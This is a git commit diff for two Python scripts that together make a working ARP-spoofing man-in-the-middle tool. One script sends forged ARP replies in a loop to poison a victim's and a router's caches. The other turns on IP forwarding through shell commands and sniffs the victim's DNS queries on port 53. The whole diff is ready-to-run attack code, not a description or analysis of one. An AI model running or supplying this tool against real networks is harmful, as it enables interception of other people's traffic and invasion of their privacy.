89cd294ea158766886cd0d566abb921e5d6bcb91
Brij Shah <brijshah0@gmail.com>
2015-10-28 22:09:54 -0700

    super cool dns stuff

--- arpSpoof.py
+++ arpSpoof.py
@@ -1,62 +1,25 @@
 #!/usr/bin/python
 
-import ConfigParser, time, thread, sys, signal, logging
+import time, sys, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
-
-# def readConfig():
-#     config = ConfigParser.ConfigParser()
-#     config.read('arp.config')
-#     # ourMac = config.get('ARP','ourmac')
-#     # print mac
-#     for option, value in config.items('ARP'):
-#     	print option, value
-def signalHandler(signal, frame):
-	print ('Ctrl+C bitch...')
-	sys.exit(0)
-
-def configSectionMap(section):
-	dict = {}
-	config = ConfigParser.ConfigParser()
-	config.read('arp.config')
-	options = config.options(section)
-	for option in options:
-		try:
-			dict[option] = config.get(section, option)
-			if dict[option] == -1:
-				DebugPrint("skip: %s" % option)
-		except:
-			print ("exception on %s!" % option)
-			dict[option] = None
-	return dict
-
-
 def arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC):
-    arpPacketVictim = Ether(src=ourMAC, dst=victimMAC)/ARP(hwsrc=ourMAC, 
-                                hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
+    arpPacketVictim = Ether(src=ourMAC
+                           , dst=victimMAC)/ARP(hwsrc=ourMAC
+                           , hwdst=victimMAC
+                           , psrc=routerIP
+                           , pdst=victimIP, op=2)
 
-    arpPacketRouter = Ether(src=ourMAC, dst=routerMAC)/ARP(hwsrc=ourMAC, 
-                                hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)
+    arpPacketRouter = Ether(src=ourMAC
+                           , dst=routerMAC)/ARP(hwsrc=ourMAC
+                           , hwdst=routerMAC
+                           , psrc=victimIP
+                           , pdst=routerIP, op=2)
     while 1:
-	    send(arpPacketVictim)
-	    send(arpPacketRouter)
-	    time.sleep(1)
-
-
-def main():
-	variables = configSectionMap()
-	thread.start_new_thread(arpSpoof(variables['routerip'], variables['routermac'], variables['victimip'], variables['victimmac'], variables['ourmac']))
-	signal.signal(signal.SIGINT, signalHandler)
-	print ('press ctrl+c')
-	signal.pause()
-
-if __name__ == '__main__':
-	main()
-
-
-
-
-
-
-
+        try:
+            sendp(arpPacketVictim, verbose=0)
+            sendp(arpPacketRouter, verbose =0)
+            time.sleep(1)
+        except KeyboardInterrupt:
+            sys.exit(0)
--- dnsSpoof.py
+++ dnsSpoof.py
@@ -1,29 +1,66 @@
 #!/usr/bin/python
 
-import logging
+import ConfigParser, os, platform, sys, signal, multiprocessing, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from scapy.layers.dns import DNSRR, DNS, DNSQR
+import arpSpoof
 
-#import arpSpoof file?
-# from arpSpoof import *
+operatingSystem = platform.system()
 
-# Get mac address of router and victim
+def configSectionMap(section):
+    dict = {}
+    config = ConfigParser.ConfigParser()
+    config.read('arp.config')
+    options = config.options(section)
+    for option in options:
+        try:
+            dict[option] = config.get(section, option)
+            if dict[option] == -1:
+                DebugPrint("skip: %s" % option)
+        except:
+            print ("exception on %s!" % option)
+            dict[option] = None
+    return dict
 
-# Enable ip forwarding (should be based on os, linux or OSX)
-	# darwin(osx)
-	# forward: sysctl -w net.inet.ip.forwarding=1
-	# not forward: sysctl -w net.inet.ip.forwarding=0
+def signalHandler(signal, frame):
+    default()
+    sys.exit(0)
 
-	# linux
-	# forward: echo 1 > /proc/sys/net/ipv4/ip_forward
-	# note forward: echo 0 > /proc/sys/net/ipv4/ip_forward
+def forward():
+    if operatingSystem == 'Darwin':
+        os.system('sysctl -w net.inet.ip.forwarding=1')
+    elif operatingSystem == 'Linux':
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
-# initiate arp spoofing (make sure to kill process cleanly on exit)
+def default():
+    if operatingSystem == 'Darwin':
+        os.system('sysctl -w net.inet.ip.forwarding=0')
+    elif operatingSystem == 'Linux':
+        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
-# sniff for DNS
-# filter='udp and port 53 and src'
+def parse(packet):
+    if packet.haslayer(DNS):
+        if packet.qdcount > 0 and isinstance(packet.qd, DNSQR):
+            name = packet.qd.qname
+        elif packet.ancount > 0 and isinstance(packet.an, DNSRR):
+            name = packet.an.rdata
+        print name
 
-	# make sure we can sniff packets
-	# if packet has UDP layer
-	# look for DNS query
-	# obtain domain name 
+
+def main():
+    variables = configSectionMap('ARP')
+    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof, args = (variables['routerip']
+                                                                   , variables['routermac']
+                                                                   , variables['victimip']
+                                                                   , variables['victimmac']
+                                                                   , variables['ourmac']))
+    arpProcess.start()
+    signal.signal(signal.SIGINT, signalHandler)
+    sniff(filter = 'udp and port 53', prn=parse)
+    signal.pause()
+    arpProcess.terminate()
+    
+
+if __name__ == '__main__':
+    main()
